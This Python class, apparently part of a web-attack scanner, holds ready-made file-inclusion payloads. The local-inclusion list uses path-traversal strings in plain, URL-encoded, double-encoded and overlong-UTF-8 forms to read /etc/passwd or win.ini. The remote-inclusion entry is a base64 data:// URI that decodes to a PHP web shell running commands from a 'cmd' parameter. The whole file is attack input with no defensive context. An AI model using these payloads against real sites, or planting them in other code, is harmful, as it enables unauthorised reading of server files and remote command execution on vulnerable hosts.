
class xfiController():

    def __init__(self):
        # list of payload: https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt
        self.lfiPayload = [
            '../../etc/passwd',
            'etc/passwd%00',
            '../../../../../../../../etc/passwd',
            'C:\\Windows\\win.ini',
            '../../../..//etc/passwd',
            '../../../../..//etc/passwd',
            '../../../../../..//etc/passwd',
            '../../../../../../..//etc/passwd',
            '../../../../../../../..//etc/passwd',
            '%2e%2e//etc/passwd',
            '%2e%2e/%2e%2e//etc/passwd',
            '%2e%2e/%2e%2e/%2e%2e//etc/passwd',
            '%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd',
            '%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd',
            '%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd',
            '%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd',
            '%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd',
            '%2e%2e%2f',
            '%252e%252e%252f',
            '%c0%ae%c0%ae%c0%af',
            '%uff0e%uff0e%u2215',
            '%uff0e%uff0e%u2216',
        ]
        self.rfiPayload = [
            'page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=',
        ]

    def lfi(self):
        print(self.lfiPayload)

    def rfi(self):
        print(self.rfiPayload)